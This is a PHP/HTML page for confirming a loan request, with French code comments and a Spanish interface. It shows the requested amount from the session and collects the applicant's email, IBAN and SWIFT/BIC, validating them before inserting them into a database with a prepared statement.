<?php
include 'db.php';
session_start(); // Démarrer la session

// Vérifier si les données existent en session
if (!isset($_SESSION['nom'], $_SESSION['montant'], $_SESSION['devise'])) {
    die("Accès non autorisé.");
}

// Récupération des informations stockées en session
$nom = $_SESSION['nom'];
$montant = $_SESSION['montant'];
$devise = $_SESSION['devise'];

$message = "";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupération et nettoyage des données du formulaire
    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
    $iban = strtoupper(trim($_POST['iban']));
    $swift = strtoupper(trim($_POST['swift']));

    // Vérification du format IBAN et SWIFT
    $ibanRegex = "/^[A-Z]{2}[0-9]{14,30}$/";
    $swiftRegex = "/^[A-Z0-9]{8,11}$/";

    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $message = "❌ Adresse e-mail invalide.";
    } elseif (!preg_match($ibanRegex, $iban)) {
        $message = "❌ IBAN invalide. Exemple : FR7612345678901234567890123";
    } elseif (!preg_match($swiftRegex, $swift)) {
        $message = "❌ Code SWIFT/BIC invalide. Exemple : ABCDUS33";
    } else {
        // Stocker les informations en session
        $_SESSION['email'] = $email;
        $_SESSION['iban'] = $iban;
        $_SESSION['swift'] = $swift;

        // Insertion dans la base de données
        try {
            $sql = "INSERT INTO info (email, iban, swift) VALUES (?, ?, ?)";
            $stmt = $pdo->prepare($sql);
            $stmt->execute([$email, $iban, $swift]);

            // Redirection vers la page de confirmation
            header("Location: thank.php");
            exit();
        } catch (PDOException $e) {
            $message = "❌ Erreur lors de l'enregistrement : " . $e->getMessage();
        }
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmation de Demande</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f9f9f9;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .card {
            background: linear-gradient(135deg, #007bff, #00c6ff);
            color: white;
            padding: 20px;
            border-radius: 15px;
            width: 280px;
            text-align: left;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
            margin-bottom: 20px;
        }
        .card h3, .card p {
            margin: 5px 0;
        }
        .amount-container {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-top: 10px;
        }
        .amount {
            font-size: 24px;
            font-weight: bold;
        }
        .eye-icon {
            cursor: pointer;
            font-size: 22px;
        }
        .form-container {
            background: white;
            padding: 15px;
            border-radius: 10px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
            width: 300px;
        }
        label {
            font-weight: bold;
            display: block;
            margin-top: 10px;
        }
        input {
            width: 93%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        .btn {
            width: 100%;
            padding: 12px;
            background: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn:hover {
            background: #218838;
        }
        .result {
            font-weight: bold;
            color: #d9534f;
            margin-top: 10px;
            text-align: center;
        }
    </style>
</head>
<body>

    <?php if (!empty($message)) : ?>
        <p class="result"><?php echo $message; ?></p>
    <?php endif; ?>

    <div class="card">
        <h3><?php echo htmlspecialchars($nom); ?></h3>
        <h3>Solicitud :</h3>
        <div class="amount-container">
            <p id="amount" class="amount"><?php echo htmlspecialchars($montant) . " " . htmlspecialchars($devise); ?></p>
            <i id="toggleAmount" class="fa-solid fa-eye eye-icon" onclick="toggleAmount()"></i>
        </div>
    </div>

    <strong style="font-size:15px;">Ingrese su número de cuenta y confirme su solicitud.</strong><br>

    <div class="form-container">
        <form action="" method="POST">
            <label>Monto del préstamo</label>
            <input type="text" value="<?php echo htmlspecialchars($montant) . " " . htmlspecialchars($devise); ?>" readonly>

            <label>Correo electrónico</label>
            <input type="email" name="email" required placeholder="Correo electrónico">

            <label>IBAN</label>
            <input type="text" name="iban" required placeholder="Entre tu IBAN">

            <label>SWIFT/BIC</label>
            <input type="text" name="swift" required placeholder="Ingrese su código SWIFT/BIC">

            <button type="submit" class="btn">
                <i class="fa-solid fa-money-bill-transfer"></i> Confirmar mi solicitud
            </button>
        </form>
    </div>

    <script>
        function toggleAmount() {
            let amount = document.getElementById("amount");
            let icon = document.getElementById("toggleAmount");

            if (amount.style.visibility === "hidden") {
                amount.style.visibility = "visible";
                icon.classList.remove("fa-eye-slash");
                icon.classList.add("fa-eye");
            } else {
                amount.style.visibility = "hidden";
                icon.classList.remove("fa-eye");
                icon.classList.add("fa-eye-slash");
            }
        }
    </script>

</body>
</html>